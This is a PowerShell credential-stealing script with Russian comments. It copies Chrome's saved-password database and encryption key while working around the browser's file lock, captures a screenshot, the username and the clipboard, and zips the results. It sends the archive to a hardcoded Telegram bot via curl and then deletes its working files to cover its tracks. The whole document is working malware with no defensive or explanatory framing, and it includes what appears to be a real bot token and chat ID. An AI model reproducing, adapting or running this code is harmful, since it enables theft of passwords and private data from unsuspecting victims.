$token = "8680192798:AAFdHwzr2HYwbGjz3gkaS5xlYjryAozMkGI"
$chatId = "1940923712"

# 1. Создаем чистую рабочую папку (избегаем ошибок доступа)
$workDir = "$env:TEMP\build_$(Get-Random)"
New-Item -ItemType Directory -Path $workDir -Force | Out-Null
$reportFile = "$workDir\report.txt"

try {
    # 2. Собираем базу паролей и ключ (раз дешифровка на лету не пошла)
    $localState = "$env:LOCALAPPDATA\Google\Chrome\User Data\Local State"
    $loginData = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"
    
    if (Test-Path $localState) { Copy-Item $localState -Destination "$workDir\key.json" }
    if (Test-Path $loginData) {
        # Копируем через поток, чтобы обойти блокировку открытого браузера
        $dest = "$workDir\passwords.db"
        $stream = [System.IO.File]::Open($loginData, [System.IO.FileMode]::Open, [System.IO.FileAccess]::Read, [System.IO.FileShare]::ReadWrite)
        $out = [System.IO.File]::Create($dest)
        $stream.CopyTo($out); $stream.Close(); $out.Close()
    }

    # 3. Скриншот
    Add-Type -AssemblyName System.Windows.Forms, System.Drawing
    $screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
    $bmp = New-Object System.Drawing.Bitmap($screen.Width, $screen.Height)
    $g = [System.Drawing.Graphics]::FromImage($bmp)
    $g.CopyFromScreen(0,0,0,0,$bmp.Size)
    $bmp.Save("$workDir\screen.png")
    $g.Dispose(); $bmp.Dispose()

    # 4. Буфер обмена и инфо
    "--- LOG ---" | Out-File $reportFile
    "User: $env:USERNAME" | Add-Content $reportFile
    "Clip: $((Get-Clipboard) -join ' ')" | Add-Content $reportFile

    # 5. Упаковка ТОЛЬКО нашей папки (не всего TEMP!)
    $zipFile = "$env:TEMP\package.zip"
    if (Test-Path $zipFile) { Remove-Item $zipFile -Force }
    Add-Type -AssemblyName System.IO.Compression.FileSystem
    [System.IO.Compression.ZipFile]::CreateFromDirectory($workDir, $zipFile)

    # 6. Отправка через curl (самый надежный способ)
    & curl.exe -s -X POST "https://api.telegram.org/bot$token/sendDocument" -F "chat_id=$chatId" -F "document=@$zipFile" -F "caption=Ready Data (Bypassed errors)"

} catch {
    $err = $_.Exception.Message
    & curl.exe -s -X POST "https://api.telegram.org/bot$token/sendMessage" -d "chat_id=$chatId" -d "text=Critical Fail: $err"
} finally {
    # Тщательная зачистка
    Remove-Item $workDir -Recurse -Force -ErrorAction SilentlyContinue
    Remove-Item $zipFile -Force -ErrorAction SilentlyContinue
}
